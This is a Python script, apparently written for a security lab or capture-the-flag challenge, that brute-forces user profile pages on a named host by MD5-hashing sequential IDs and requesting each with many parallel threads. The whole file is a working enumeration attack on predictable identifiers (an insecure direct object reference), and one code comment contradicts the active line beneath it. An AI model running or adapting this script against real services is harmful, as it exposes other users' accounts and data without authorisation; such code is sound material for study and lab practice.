import hashlib
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://chatelaine.cylabacademy.net:22223/profile/user/"
START = 1
END = 10000
MAX_WORKERS = 20  # Tune this if the server rate-limits you

def check_user(uid):
    md5_hash = hashlib.md5(str(uid).encode()).hexdigest()
    url = f"{BASE_URL}{md5_hash}"
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True)
        # Adjust the condition below based on what the server returns for invalid users
        if resp.status_code == 200 and "User not found" not in resp.text:
            return uid, md5_hash, True, resp.status_code
        else:
            return uid, md5_hash, False, resp.status_code
    except requests.RequestException as e:
        return uid, md5_hash, False, f"ERROR: {e}"

def main():
    print(f"Scanning users {START} to {END} via MD5 hash...")
    print(f"Base URL: {BASE_URL}\n")

    found = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(check_user, uid): uid for uid in range(START, END + 1)}
        for i, future in enumerate(as_completed(futures), 1):
            uid, md5_hash, valid, status = future.result()
            if valid:
                print(f"[FOUND] ID: {uid:5d} | MD5: {md5_hash} | Status: {status}")
                found.append((uid, md5_hash))
            else:
                # Uncomment the line below to see all attempts (very verbose)
                print(f"[    ] ID: {uid:5d} | MD5: {md5_hash} | Status: {status}")
                pass

            # Progress update every 500
            if i % 500 == 0:
                print(f"  ... checked {i}/{END - START + 1} ({100*i//(END-START+1)}%)", file=sys.stderr)

    print(f"\n=== Done. Found {len(found)} valid user(s): ===")
    for uid, md5_hash in sorted(found):
        print(f"  ID {uid:5d} -> {BASE_URL}{md5_hash}")

if __name__ == "__main__":
    main()
